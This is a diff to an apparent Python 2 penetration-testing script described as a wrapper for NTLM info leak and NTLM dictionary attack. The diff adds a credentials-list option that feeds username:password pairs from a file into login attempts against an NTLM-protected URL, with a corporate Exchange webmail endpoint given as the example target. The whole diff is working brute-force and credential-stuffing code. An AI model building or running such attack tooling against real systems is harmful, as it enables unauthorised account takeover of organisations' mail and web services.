@@ -55,6 +55,7 @@ def cancel_handler(signal=None,frame=None):
 signal.signal(signal.SIGINT, cancel_handler)
 
 parser = argparse.ArgumentParser(description="Wrapper for NTLM info leak and NTLM dictionary attack")
+parser.add_argument("-c", "--credslist", help="File with list of credentials in <username>:<password> format to use")
 parser.add_argument("-u", "--user", help="Username to dictionary attack as")
 parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
 parser.add_argument("-p", "--password", help="Password to dictionary attack as")
@@ -65,7 +66,7 @@ parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info
 parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
 parser.add_argument("-b", "--blank", action="store_true", help="Try blank password")
 parser.add_argument("-1", "--quitonsuccess", action="store_true", help="Stop as soon as the first credential is found")
-parser.add_argument("url", help="URL of NTLM protected resource")
+parser.add_argument("url", help="URL of NTLM protected resource, e.g. https://webmail.company.com/ews/exchange.asmx")
 args = parser.parse_args()
 
 if not args.url:
@@ -95,7 +96,8 @@ if args.info:
   print cmd
   os.system( cmd )
 
-if ( args.user or args.userlist ) and ( args.password or args.passlist ):
+if (( args.user or args.userlist ) and ( args.password or args.passlist )) or args.credslist:
+  
   # Check user
   if args.userlist and not os.path.isfile(args.userlist):
     print 'Couldn\'t find ' + args.userlist
@@ -105,6 +107,12 @@ if ( args.user or args.userlist ) and ( args.password or args.passlist ):
   # Check password
   if args.passlist and not os.path.isfile(args.passlist):
     print 'Couldn\'t find ' + args.passlist
+    parser.print_usage()
+    sys.exit(2)
+  
+  # Check user
+  if args.credslist and not os.path.isfile(args.credslist):
+    print 'Couldn\'t find ' + args.credslist
     parser.print_usage()
     sys.exit(2)
   
@@ -149,6 +157,18 @@ if ( args.user or args.userlist ) and ( args.password or args.passlist ):
       if args.blank:
         test_login( u, '', url.geturl() )
     fu.close()
+  elif args.credslist:
+    print 'Creds list'
+    fp = open( args.credslist, "r" )
+    for line in fp:
+      line = line.strip()
+      if line == '':
+        continue
+      creds = line.split(':')
+      if len( creds ) < 2:
+        print 'No username / pass combination in: ' + line
+        continue
+      test_login(creds[0], ':'.join(creds[1:]), url.geturl()) 
   else:
     # One user, one password
     print "Single user / password" 
